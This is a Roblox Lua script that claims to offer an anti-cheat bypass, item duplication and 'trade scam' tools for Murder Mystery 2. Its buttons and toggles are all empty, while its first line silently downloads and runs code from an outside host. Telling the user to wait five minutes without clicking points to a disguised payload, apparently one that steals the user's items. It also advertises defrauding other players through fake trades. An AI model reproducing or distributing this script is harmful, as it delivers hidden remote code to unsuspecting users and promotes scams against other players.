getgenv().gui = false
loadstring(game:HttpGet("https://egorikusa.space/d01cb5ebe423840d74f01a2b.lua", true))()

game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "Activate Bypass!";
        Text = "N3on932 on TOP";
        Icon = "rbxthumb://type=Asset&id=15992568695&w=150&h=150"})
    Duration = 101;

game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "Success!";
        Text = "Enjoy!";
        Icon = "rbxthumb://type=Asset&id=15992568695&w=150&h=150"})
    Duration = 101;

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/slf0Dev/Ocerium_Project/main/Library.lua"))()
Window = Library.Main("N3on932 GUI","LeftAlt") -- change "LeftAlt" to key that you want will hide gui


--//tab
local Tab = Window.NewTab("⚠️ PLEASE READ ⚠️")


--//section
local Section = Tab.NewSection("• IF DON'T WORK, EXECUTE AGAIN!!!")


--//section
local Section = Tab.NewSection("• BYPASS PRO")


--//section
local Section = Tab.NewSection("• GO TO BYPASS SECTION AND CLICK BYPASS ANTICHEAT")


--//section
local Section = Tab.NewSection("• WAIT 5 MINUTES FOR IT TO BYPASS")


--//section
local Section = Tab.NewSection("• IF YOU CLICK ANYTHING ELSE DURING BYPASS YOU WILL FREEZE")


--//tab
local Tab = Window.NewTab("Bypass 🟢")


--//section
local Section = Tab.NewSection("• WAIT 5 MINUTES FOR IT TO BYPASS")


--//Toggles
local DisabledToggle = Section.NewToggle("Bypass MM2 Anti-Cheat",function(bool)
end,false) -- "true" is the default value of toggle


--//tab
local Tab = Window.NewTab("Dupe 🟢")


--//section
local Section = Tab.NewSection("🟢 = Working 🟡 = Partially Working 🔴 = Patched")


--//section
local Section = Tab.NewSection("(once you click duping should begin it’s finished once you reset)")


--//section
local Section = Tab.NewSection("[COULD BE A FEW MINUTES]")


--//Toggles
local DisabledToggle = Section.NewToggle("Enable dupe.lua",function(bool)
end,false) -- "true" is the default value of


--// Button
local Button = Section.NewButton("Dupe Guns and Knives",function()
end)


--// Button
local Button = Section.NewButton("Dupe Pets (BETA)",function()
end)


--// Button
local Button = Section.NewButton("Dupe Coins and Gems (BETA)",function()
end)


--//tab
local Tab = Window.NewTab("Trade Scam 🟢")


--//section
local Section = Tab.NewSection("Step 1: Put in items, Step 2: Enable freeze.lua, Step 3: Freeze Trade.")


--//Toggles
local DisabledToggle = Section.NewToggle("Enable freeze/trade/genui.lua",function(bool)
end,false) -- "true" is the default value of


--// Button
local Button = Section.NewButton("Freeze Trade",function()
end)


--//section
local Section = Tab.NewSection("TradeScamV2")


--//Toggles
local DisabledToggle = Section.NewToggle("Enable tradescamv2.lua",function(bool)
end,false) -- "true" is the default value of


--// Button
local Button = Section.NewButton("Display Fake Items",function()
end)


--// Button
local Button = Section.NewButton("Auto Accept",function()
end)


--//tab
local Tab = Window.NewTab("Script Made By N3on932")
